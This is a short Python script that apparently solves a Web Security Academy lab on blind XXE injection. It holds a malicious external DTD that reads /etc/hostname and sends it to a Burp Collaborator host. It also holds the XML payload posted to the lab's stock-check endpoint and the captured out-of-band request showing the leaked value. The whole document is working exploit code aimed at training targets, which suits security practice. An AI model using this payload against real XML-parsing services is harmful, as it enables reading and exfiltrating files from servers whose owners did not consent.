import requests



# Exploit server payload
"""
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://bapqzyctqtzwkmyxzzjiioz2ptvnjc.burpcollaborator.net/?x=%file;'>">
%eval;
%exfiltrate;
"""

data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://exploit-aca71f551f1cc3c9c0b6119101fd005b.web-security-academy.net/exploit.dtd"> %xxe;]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'

response = requests.post('https://acb11f4c1f19c316c04d111d001800e9.web-security-academy.net/product/stock', data=data)
print(response.content.decode('utf-8'))

# Request to collaborator
"""
GET /?x=80500f4d3a87 HTTP/1.1
User-Agent: Java/12.0.2
Host: bapqzyctqtzwkmyxzzjiioz2ptvnjc.burpcollaborator.net
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
"""
